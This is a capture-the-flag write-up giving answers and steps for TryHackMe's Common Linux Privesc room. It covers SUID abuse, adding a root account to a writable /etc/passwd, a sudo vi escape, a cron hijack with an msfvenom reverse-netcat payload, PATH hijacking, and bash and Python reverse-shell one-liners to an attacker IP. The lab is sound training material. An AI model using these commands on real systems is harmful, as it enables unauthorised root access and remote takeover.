#  TryHackMe - Common Linux Privesc (Room 004)

## Important Information

To start this test, login using the credentials __user3:password__

<details><summary>Tasks 4.1 - 4.5</summary>
<p>

## Task 4.1

#### Q: What is the target's hostname?

A: polobox

Walkthrough: Learnt through __LinEnum.sh__ or by running the `hostname` command

![](/Common%20Linux%20Privesc/images/hostname_through_linenum.png)
![](/Common%20Linux%20Privesc/images/hostname_through_command.png)

## Task 4.2

#### Q: Look at the output of /etc/password. How many "user[x]" are there on the system?

A: 8

Walkthrough: Learnt through __LinEnum.sh__ or by running the `cat /etc/passwd` command

![](/Common%20Linux%20Privesc/images/passwd_through_linenum.png)
![](/Common%20Linux%20Privesc/images/passwd_through_command.png)

## Task 4.3

#### Q: How many available shells are there on the system?

A: 4

Walkthrough: Learnt through __LinEnum.sh__ or by running the `cat /etc/shells` command

![](/Common%20Linux%20Privesc/images/shells_through_linenum.png)
![](/Common%20Linux%20Privesc/images/shells_through_command.png)

## Task 4.4

#### Q: What is the name of the bash script that is set to run every 5 minutes by cron?

A: autoscript.sh

Walkthrough: Learnt through __LinEnum.sh__ or by running the `cat /etc/crontab` command

![](/Common%20Linux%20Privesc/images/crontab_through_linenum.png)
![](/Common%20Linux%20Privesc/images/crontab_through_command.png)

## Task 4.5

#### What critical file has had its permissions changed to allow some users to write to it?

A: /etc/passwd

Walkthrough: Learnt through __LinEnum.sh__ or by running the `ls -l /etc/passwd` command

![](/Common%20Linux%20Privesc/images/sens_through_linenum.png)
![](/Common%20Linux%20Privesc/images/sens_through_command.png)

</p>
</details>

<details><summary>Tasks 5.1 - 5.3</summary>
<p>

## Task 5.1

### What is the path of the file in user3's directory that stands out to you?

A: /home/user3/shell

Walkthrough: Learnt through the [`find`](https://github.com/ComplexSec/tryhackme/blob/master/Common%20Linux%20Privesc/notes.md) command located in notes.md

![](/Common%20Linux%20Privesc/images/find_suid.png)

## Task 5.2 - no answer needed

We know that "shell" is a SUID bit file, therefore running it will run the script as a root user. Run it

## Task 5.3 - no answer needed

You should have a root shell

![](/Common%20Linux%20Privesc/images/root_shell.png)

</p>
</details>

<details><summary>Tasks 6.1 - 6.6</summary>
<p>

## Task 6.1 - no answer needed

First, exit out of root by typing `exit` and swap to user using the `su -l user7` command. The password is __password__

## Task 6.2

### Q: What direction privilege escalation is this attack?

A: Vertical

Walkthrough: Learnt through the diagram at the very top

## Task 6.3

### Q: Before we add our new user, we first need to create a compliant password hash to add. We do this by using the command: "openssl passwd -1 -salt [salt] [password]"

### What is the hash created by using this command with the salt "new" and the password "123"?

A: $1$new$p7ptkEKU1HnaHpRtzNizS1

Walkthrough: Learnt through executing the command

![](/Common%20Linux%20Privesc/images/openssl.png)

## Task 6.4

### Now, we need to take this value and create a new root account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created?

A: new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

Walkthrough: Learnt through the [/etc/passwd format](https://github.com/ComplexSec/tryhackme/blob/master/Common%20Linux%20Privesc/notes.md) section inside in notes.md

## Task 6.6

### Q: Now, use "su" to login as the "new" account. You should be greeted with a root prompt

![](/Common%20Linux%20Privesc/images/root_shell2.png)

</p>
</details>

<details><summary>Tasks 7.1 - 7.4</summary>
<p>

## Task 7.1 - no answer needed

First, swap user to user8 with the password of `password` using the `su -l user8` command

## Task 7.2

### Q: Using the `sudo -l` command, what does user8 require (or not require) to run vi as root?

A: NOPASSWD

Walkthrough: Learnt through running the `sudo -l` command

## Task 7.3 - no answer needed

All we need to do is open vi as root by typing `sudo vi`

## Task 7.4 - no answer needed

Now, type `:!sh` to open a shell from Vi

![](/Common%20Linux%20Privesc/images/vi_shell.png)

</p>
</details>

<details><summary>Tasks 8.1 - 8.8</summary>
<p>

## Task 8.1 - no answer needed

Login as user4 with the password `password` using the `su -l user4` command

## Task 8.2 - no answer needed

Let's create a payload for our cron exploit using msfvenom

## Task 8.3

### Q: What is the flag to specify a payload in msfvenom?

A: `-p`

Walkthrough: Learnt through Google or through `msfvenom -h` command

![](/Common%20Linux%20Privesc/images/msfvenom_payload.png)

## Task 8.4 - no answer needed

Create a payload using `msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=8888 R`

![](/Common%20Linux%20Privesc/images/payload_generation.png)

## Task 8.5

### Q: What directory is the autoscript.sh under?

A: /home/user4/Desktop

## Task 8.6 - no answer needed

Replace the contents of the file with our payload using `echo <msfvenom> > autoscript.sh`

## Task 8.7 - no answer needed

After copying the code into autoscript.sh, start a netcat listener using the `nc -nvlp 8888` command on our Kali machine

![](/Common%20Linux%20Privesc/images/netcat_listen.png)

## Task 8.8 - no answer needed

After 5 minutes, we should get a shell

## Extra Task

In order to get a cleaner looking shell (known as TTY shell), try spawning one via the [NetSec list](https://netsec.ws/?p=337)

![](/Common%20Linux%20Privesc/images/spawn_ttyshell.png)

## Alternative Way without MSFVenom

Can create a shell without generating a payload using MSFVenom either through Bash, Python or other means

* Bash - `bash -i >& /dev/tcp/<IP>/8888 0>&1`
* Python - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker ip>",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

![](/Common%20Linux%20Privesc/images/python_shell.png)

</p>
</details>

<details><summary>Tasks 9.1 - 9.7</summary>
<p>

## Task 9.1 - no answer needed

Login as user5 with the password `password` using the `su -l user5` command

## Task 9.2

### Q: Go to user5's home directory and run the file `script`. What command is it executing?

A: `ls`

Walkthrough: When ran, it lists the files. To list in files in Linux, the `ls` command is used

![](/Common%20Linux%20Privesc/images/script_ls.png)

## Task 9.3 - no answer needed

Now we know what command to imitate, change directory to /tmp

## Task 9.4

Now, create an imitation executable. The format is:

* `echo "<command>"" > <name of executable we imitate>`

### Q: What would the command look like to open a bash shell, writing to a file with the name of the executable we are imitating?

A: echo "/bin/bash" > ls

Walkthrough: `/bin/bash` is the command and `ls` is the command we are imitating

## Task 9.5

Now that the imitation is made, make it an executable

### Q: What command do you use?

A: chmod +x ls

## Task 9.6 - no answer needed

Next, you need to change the PATH variable, so it points to the directory where we have our imitation "ls". Done via the `export PATH=/tmp:$PATH` command

This will cause you to open a shell every time you use `ls`. To use the proper `ls` command, use `/bin/ls` instead

To reset the PATH variable, simply type `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH`

## Task 9.7

Change back to the home directory and run the `script` file again

![](/Common%20Linux%20Privesc/images/root_PATH.png)

</p>
</details>